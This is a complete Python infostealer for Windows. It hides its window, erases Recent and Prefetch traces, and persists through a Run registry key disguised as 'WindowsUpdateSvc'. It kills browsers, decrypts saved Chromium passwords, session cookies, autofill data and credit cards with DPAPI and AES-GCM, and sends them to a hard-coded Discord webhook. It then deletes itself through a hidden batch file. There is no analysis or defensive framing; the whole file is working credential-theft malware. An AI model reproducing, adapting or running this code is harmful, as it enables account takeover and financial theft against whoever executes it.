import os
import json
import base64
import sqlite3
from pathlib import Path
import subprocess
import requests
import time
import sys
import shutil
import tempfile
import random
import string
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES
from typing import Optional, Union
import ctypes
import ctypes.wintypes

# ============= ULTRA SILENT LAUNCH - NO CONSOLE, NO WINDOW, NO TRACE =============
# Hide console IMMEDIATELY at the absolute earliest point
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

# Get and hide console window instantly
hwnd = kernel32.GetConsoleWindow()
if hwnd:
    user32.ShowWindow(hwnd, 0)  # 0 = SW_HIDE
    user32.SetWindowLongW(hwnd, -20, 0)  # -20 = GWL_EXSTYLE, 0 = Remove all styles
    
# Hide the current process window from taskbar
user32.ShowWindow(user32.GetForegroundWindow(), 0)

# Set process to background/ silent mode
kernel32.SetProcessShutdownParameters(0x100, 0)

# Detach from any parent console
ctypes.windll.kernel32.FreeConsole()

# Allocate a new console but hide it immediately (if somehow created)
if ctypes.windll.kernel32.AllocConsole():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Prevent any future console allocation
ctypes.windll.kernel32.SetConsoleCtrlHandler(None, 1)

# =============================================================================

WEBHOOK = "https://discord.com/api/webhooks/1471126049222819959/TQYJARExg3UWgewSRrGx_5o50VfoiIpBmo9CspI2XuDvRwU_vCUtQ1NhPoZWqxOsbcff"
ROAMING = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")

# Hidden storage path - use more legitimate looking Windows path
STORAGE_PATH = Path(os.environ['LOCALAPPDATA']) / 'Microsoft' / 'Windows' / 'Caches'
if not STORAGE_PATH.exists():
    STORAGE_PATH.mkdir(parents=True, exist_ok=True)

DATA_FILE = STORAGE_PATH / 'sys.dat'
SCRIPT_COPY = STORAGE_PATH / 'winupdate.exe'  # Changed to .exe for compiled version

BROWSER_PATHS = {
    'Chrome': LOCAL + r'\Google\Chrome\User Data',
    'Chrome SxS': LOCAL + r'\Google\Chrome SxS\User Data',
    'Edge': LOCAL + r'\Microsoft\Edge\User Data',
    'Brave': LOCAL + r'\BraveSoftware\Brave-Browser\User Data',
    'Opera': ROAMING + r'\Opera Software\Opera Stable',
    'Opera GX': ROAMING + r'\Opera Software\Opera GX Stable',
    'Vivaldi': LOCAL + r'\Vivaldi\User Data',
    'Yandex': LOCAL + r'\Yandex\YandexBrowser\User Data',
}

def is_online():
    """Check if internet connection is available"""
    try:
        requests.get('https://discord.com', timeout=3)
        return True
    except:
        return False

def vanish_icon():
    """Remove any trace of the executable icon and window immediately"""
    try:
        # Remove from taskbar
        hwnd = user32.GetForegroundWindow()
        user32.ShowWindow(hwnd, 0)
        
        # Hide from Alt+Tab
        user32.SetWindowLongW(hwnd, -20, 0x80)  # 0x80 = WS_EX_TOOLWINDOW
        
        # Remove from recently used list
        os.system('del /f /q "%APPDATA%\\Microsoft\\Windows\\Recent\\*.lnk" > nul 2>&1')
        
        # Clear any potential traces
        if getattr(sys, 'frozen', False):
            # Running as compiled exe
            exe_name = os.path.basename(sys.executable).replace('.exe', '')
            os.system(f'del /f /q "C:\\Windows\\Prefetch\\{exe_name.upper()}*" > nul 2>&1')
    except:
        pass

def persist():
    """Copy itself to hidden location and add to registry for persistence"""
    try:
        if not SCRIPT_COPY.exists():
            # Get the current executable path
            if getattr(sys, 'frozen', False):
                # Running as compiled exe
                current_exe = sys.executable
            else:
                # Running as script
                current_exe = sys.argv[0]
            shutil.copy2(current_exe, SCRIPT_COPY)
        
        # Add to registry startup
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, 'WindowsUpdateSvc', 0, winreg.REG_SZ, f'"{SCRIPT_COPY}"')
    except:
        pass

def cleanup():
    """Self delete all traces with no evidence"""
    try:
        # Delete data file
        if DATA_FILE.exists():
            os.remove(DATA_FILE)
        
        # Delete script/exe copy
        if SCRIPT_COPY.exists():
            os.remove(SCRIPT_COPY)
        
        # Remove from registry
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, 'WindowsUpdateSvc')
        except:
            pass
        
        # Delete folder if empty
        try:
            STORAGE_PATH.rmdir()
        except:
            pass
        
        # Self destruct - completely remove all traces
        time.sleep(1)
        
        # Get the current executable path
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = sys.argv[0]
        
        # Create batch file for self-deletion and run hidden
        bat_path = os.path.join(os.environ['TEMP'], f'cleanup_{int(time.time())}.bat')
        with open(bat_path, 'w') as f:
            f.write(f'''@echo off
del /f /q "{exe_path}" > nul 2>&1
del /f /q "%~f0" > nul 2>&1
''')
        
        # Run batch file with zero visibility
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE
        
        subprocess.Popen(
            ['cmd.exe', '/c', bat_path], 
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        
        sys.exit(0)
    except:
        pass

def kill_browsers():
    """Kill Chromium-based browsers to unlock databases"""
    processes = ['chrome.exe', 'msedge.exe', 'opera.exe', 'vivaldi.exe', 'opera gx.exe', 'brave.exe', 'yandex.exe']
    
    for proc in processes:
        try:
            subprocess.run(
                ['taskkill', '/F', '/IM', proc],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except:
            pass
    
    time.sleep(2.5)

def get_master_key(local_state_path: Path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
            return None
            
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        
        if encrypted_key[:5] != b'DPAPI':
            return None
            
        encrypted_key = encrypted_key[5:]
        
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception:
        return None

def decrypt_password(buff: bytes, master_key: bytes) -> Union[str, None]:
    try:
        if len(buff) < 15:
            return None
            
        try:
            decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
            return decrypted.decode('utf-8')
        except:
            pass
            
        if buff[:3] in [b'v10', b'v11']:
            nonce = buff[3:15]
            ciphertext = buff[15:-16]
            tag = buff[-16:]
            
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8')
            
        return None
    except:
        return None

def decrypt_cookie(buff: bytes, master_key: bytes) -> Union[str, None]:
    try:
        if len(buff) < 15:
            return None
            
        try:
            decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
            try:
                return decrypted.decode('utf-8')
            except:
                return base64.b64encode(decrypted).decode('ascii')
        except:
            pass
            
        if buff[:3] in [b'v10', b'v11']:
            nonce = buff[3:15]
            ciphertext = buff[15:-16]
            tag = buff[-16:]
            
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            
            if len(decrypted) > 32:
                actual_value = decrypted[32:]
            else:
                actual_value = decrypted
            
            try:
                return actual_value.decode('utf-8')
            except:
                return base64.b64encode(actual_value).decode('ascii')
                
        if len(buff) > 15:
            try:
                nonce = buff[3:15]
                ciphertext = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt(ciphertext)
                decrypted = decrypted.rstrip(b'\x00')
                
                if len(decrypted) > 32:
                    actual_value = decrypted[32:]
                else:
                    actual_value = decrypted
                    
                try:
                    return actual_value.decode('utf-8')
                except:
                    return base64.b64encode(actual_value).decode('ascii')
            except:
                pass
                
        return None
    except Exception:
        return None

def decrypt_generic(buff: bytes, master_key: bytes) -> Union[str, None]:
    try:
        if len(buff) < 15:
            return None
            
        try:
            decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
            try:
                return decrypted.decode('utf-8')
            except:
                return base64.b64encode(decrypted).decode('ascii')
        except:
            pass
            
        if buff[:3] in [b'v10', b'v11']:
            nonce = buff[3:15]
            ciphertext = buff[15:-16]
            tag = buff[-16:]
            
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            
            try:
                return decrypted.decode('utf-8')
            except:
                return base64.b64encode(decrypted).decode('ascii')
                
        return None
    except:
        return None

def chrome_timestamp_to_datetime(ts_microseconds: int) -> str:
    if ts_microseconds == 0:
        return "Unknown"
    try:
        dt = datetime(1601, 1, 1) + timedelta(microseconds=ts_microseconds)
        return dt.strftime('%Y-%m-%d %H:%M:%S')
    except:
        return "Invalid date"

def extract_from_db(db_path: Path, query: str, columns: list, master_key: Union[bytes, None] = None, data_type: str = 'generic'):
    results = []
    
    if not db_path.exists():
        return results
    
    try:
        temp_db = Path(os.environ['TEMP']) / f"{db_path.stem}_{int(time.time())}.db"
        import shutil
        shutil.copy2(db_path, temp_db)
        
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        cursor.execute(query)
        
        for row in cursor.fetchall():
            row_data = {}
            for idx, col in enumerate(columns):
                value = row[idx]
                
                if col in ['password_value', 'encrypted_value', 'value', 'card_number_encrypted'] and master_key and value:
                    if isinstance(value, str):
                        value = value.encode('utf-8')
                    
                    if data_type == 'password':
                        decrypted = decrypt_password(value, master_key)
                    elif data_type == 'cookie':
                        decrypted = decrypt_cookie(value, master_key)
                    else:
                        decrypted = decrypt_generic(value, master_key)
                    
                    if decrypted:
                        row_data[col] = decrypted
                    else:
                        if isinstance(value, bytes):
                            row_data[col] = f"[ENCRYPTED: {base64.b64encode(value).decode('ascii')}]"
                        else:
                            row_data[col] = "[DECRYPTION_FAILED]"
                        
                elif col in ['date_created', 'date_last_used', 'expires_utc', 'last_visit_time', 'visit_time']:
                    row_data[col] = chrome_timestamp_to_datetime(value) if value else "Unknown"
                else:
                    if isinstance(value, bytes):
                        try:
                            row_data[col] = value.decode('utf-8')
                        except:
                            row_data[col] = base64.b64encode(value).decode('ascii')
                    else:
                        row_data[col] = value
                    
            results.append(row_data)
            
        conn.close()
        os.remove(temp_db)
        
    except Exception:
        try:
            conn.close()
        except:
            pass
            
    return results

def extract_from_browser(browser_root: Path, profile: str = 'Default'):
    profile_path = browser_root / profile
    local_state_path = browser_root / 'Local State'
    
    master_key = get_master_key(local_state_path) if local_state_path.exists() else None
    
    data = {
        'passwords': [],
        'cookies': [],
        'autofill': [],
        'credit_cards': [],
        'history': []
    }
    
    login_db = profile_path / 'Login Data'
    if login_db.exists():
        query = "SELECT origin_url, username_value, password_value FROM logins"
        columns = ['origin_url', 'username_value', 'password_value']
        data['passwords'] = extract_from_db(login_db, query, columns, master_key, 'password')
    
    cookies_db = profile_path / 'Network' / 'Cookies'
    if not cookies_db.exists():
        cookies_db = profile_path / 'Cookies'
    
    if cookies_db.exists():
        query = "SELECT host_key, name, path, encrypted_value, expires_utc, creation_utc FROM cookies"
        columns = ['host_key', 'name', 'path', 'encrypted_value', 'expires_utc', 'creation_utc']
        data['cookies'] = extract_from_db(cookies_db, query, columns, master_key, 'cookie')
    
    webdata_db = profile_path / 'Web Data'
    if webdata_db.exists():
        query = "SELECT name, value FROM autofill"
        columns = ['name', 'value']
        data['autofill'] = extract_from_db(webdata_db, query, columns, master_key, 'generic')
    
    if webdata_db.exists():
        query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
        columns = ['name_on_card', 'expiration_month', 'expiration_year', 'card_number_encrypted']
        data['credit_cards'] = extract_from_db(webdata_db, query, columns, master_key, 'generic')
    
    history_db = profile_path / 'History'
    if history_db.exists():
        query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000"
        columns = ['url', 'title', 'visit_count', 'last_visit_time']
        data['history'] = extract_from_db(history_db, query, columns, master_key, 'generic')
    
    return data

def main():
    # INSTANTLY VANISH - hide any trace of execution
    vanish_icon()
    
    # Establish persistence
    persist()
    
    # Kill browsers to unlock databases
    kill_browsers()
    
    all_results = {}
    
    # Extract Chromium-based browsers only (Firefox removed)
    for name, base_str in BROWSER_PATHS.items():
        base = Path(base_str)
        if not base.exists():
            continue

        profiles = ['Default'] + [f'Profile {i}' for i in range(0, 10)]
        for profile in profiles:
            profile_path = base / profile
            if not profile_path.exists():
                continue

            data = extract_from_browser(base, profile)
            if any(len(v) > 0 for v in data.values()):
                all_results.setdefault(name, {}).setdefault(profile, data)
    
    # Save data to hidden file
    if all_results:
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(all_results, f, indent=2, default=str)
    
    # Check if online
    if is_online():
        discord_send()
        cleanup()
    else:
        wait_and_send()

def wait_and_send():
    max_attempts = 2880
    attempt = 0
    
    while attempt < max_attempts:
        if is_online():
            if DATA_FILE.exists():
                discord_send()
                cleanup()
            break
        
        time.sleep(30)
        attempt += 1
    
    sys.exit(0)

def discord_send():
    """Send the extracted data to Discord webhook"""
    try:
        if DATA_FILE.exists():
            with open(DATA_FILE, "rb") as f:
                files = {
                    "file": ("browser_data.json", f, "application/json")
                }
                response = requests.post(WEBHOOK, files=files, timeout=10)
                
                if response.status_code == 200:
                    time.sleep(1)
    except:
        pass

if __name__ == "__main__":
    # Prevent multiple instances
    try:
        import win32event, win32api, winerror
        mutex = win32event.CreateMutex(None, False, "WindowsUpdateSvc_Mutex")
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            sys.exit(0)
    except:
        pass
    
    main()